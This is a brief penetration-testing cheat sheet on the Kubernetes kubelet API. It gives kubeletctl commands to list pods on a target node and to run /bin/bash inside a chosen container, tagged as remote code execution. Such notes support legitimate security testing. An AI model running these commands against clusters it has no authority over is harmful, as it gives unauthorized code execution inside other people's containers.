---
title: "Kubelet"
date: 2025-7-25
tags: ["Kubelet", "Kubernetes", "Container", "RCE"]
---

### General

```console
# List all the pods on the node
kubeletctl pods -s <TARGET>
```

```console
# List running pods
kubeletctl runningpods -s <TARGET>
```

```console
# Exec command
kubeletctl exec "/bin/bash" -p <POD_NAME> -c <CONTAINER_NAME> -s <TARGET>
```

<small>*Ref: [kubeletctl](https://github.com/cyberark/kubeletctl)*</small>
